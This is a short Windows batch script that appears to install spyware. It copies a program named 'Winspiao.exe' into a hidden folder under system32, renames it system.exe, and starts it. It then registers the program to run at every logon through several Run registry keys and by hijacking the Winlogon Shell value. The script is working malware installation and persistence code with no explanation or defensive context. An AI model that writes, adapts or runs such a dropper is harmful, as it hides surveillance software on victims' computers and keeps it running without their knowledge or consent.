@echo off
md %windir%\system32\System
xcopy/e/c/k/y Arquivos %windir%\system32\system
%systemdrive%
cd %windir%\system32\system
ren Winspiao.exe system.exe
attrib +s +h .
start system.exe
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /d %windir%\system32\system\system.exe /v SYSTEM /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /d %windir%\system32\system\system.exe /v SYSTEM /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run /d %windir%\system32\system\system.exe /v SYSTEM /f
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /d %windir%\system32\system\system.exe /v Run /f
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /d "explorer.exe %windir%\system32\system\system.exe" /v Shell /f